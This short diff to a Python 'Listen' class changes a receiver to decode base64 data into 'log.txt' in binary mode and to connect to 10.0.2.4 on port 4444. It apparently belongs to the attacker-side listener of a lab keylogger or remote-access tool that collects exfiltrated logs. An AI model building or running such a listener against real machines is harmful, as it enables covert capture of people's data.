@@ -15,7 +15,7 @@ class Listen():
         print("connection")
     
     def save_file(self,content):
-        with open("log.txt","a") as file:
+        with open("log.txt","wb") as file:
             file.write(base64.b64decode(content))
 
     def json_send(self,data):
@@ -41,7 +41,7 @@ class Listen():
                 exit()
             time.sleep(10)
 
-a = Listen("10.0.2.4")
+a = Listen("10.0.2.4",4444)
 a.Save_log()
             
 
